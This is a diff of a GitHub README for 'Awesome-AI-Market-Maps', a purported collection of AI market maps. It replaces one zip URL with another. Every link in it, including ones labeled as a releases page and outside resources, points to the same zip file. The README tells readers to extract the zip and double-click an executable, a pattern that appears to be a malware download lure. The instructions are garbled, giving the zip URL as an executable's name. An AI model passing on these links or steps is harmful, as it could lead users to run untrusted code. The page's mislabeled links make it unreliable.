@@ -1,6 +1,6 @@
 # 🗺️ Awesome-AI-Market-Maps - Explore the Future of AI Ecosystems
 
-[![Download](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip)](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip)
+[![Download](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip)](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip)
 
 ## 📖 Overview
 
@@ -11,19 +11,19 @@ Awesome-AI-Market-Maps provides an extensive collection of over 275 AI market ma
 Follow these steps to successfully download and run the Awesome-AI-Market-Maps application:
 
 1. **Visit the Download Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip) to find the latest version.
+   Go to the [Releases page](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip) to find the latest version.
 
 2. **Choose a Version:**  
    On the Releases page, you will see a list of versions. Select the latest one by looking for the version number labeled as "Latest."
 
 3. **Download the Application:**  
-   Click on the link to download the file associated with the latest version. The file will be a compressed format (like a `.zip` or `https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip`), which you will need to extract.
+   Click on the link to download the file associated with the latest version. The file will be a compressed format (like a `.zip` or `https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip`), which you will need to extract.
 
 4. **Extract the Files:**  
    After the download completes, locate the downloaded file in your computer's Downloads folder. Right-click on the file and choose "Extract All." Follow the prompts to extract the files to a new folder.
 
 5. **Open the Application:**  
-   Navigate to the folder where you extracted the files. Look for an executable file (often named `https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip` or similar). Double-click this file to open the application.
+   Navigate to the folder where you extracted the files. Look for an executable file (often named `https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip` or similar). Double-click this file to open the application.
 
 6. **Explore the Features:**  
    Once the application is running, take some time to explore its features. You can browse through various AI market maps, read detailed descriptions, and see how different AI startups are positioned in the market.
@@ -72,11 +72,11 @@ For further assistance, check out the community discussions or look for similar 
 
 For more information on AI market trends and updates, consider visiting the following resources:
 
-- [AI Startups Hub](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip)
-- [Machine Learning Insights](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip)
+- [AI Startups Hub](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip)
+- [Machine Learning Insights](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip)
 
 ## 🔗 Download & Install
 
-To get started with Awesome-AI-Market-Maps, visit the [Releases page](https://raw.githubusercontent.com/LUCIFER1100001/Awesome-AI-Market-Maps/main/gaffer/Awesome-AI-Market-Maps.zip) and follow the steps outlined above.
+To get started with Awesome-AI-Market-Maps, visit the [Releases page](https://github.com/LUCIFER1100001/Awesome-AI-Market-Maps/raw/refs/heads/main/gaffer/A-Maps-Market-Awesome-v1.9.zip) and follow the steps outlined above.
 
 If you have any questions or need help, feel free to reach out through the issues tab on our GitHub page. Enjoy exploring the future of AI!
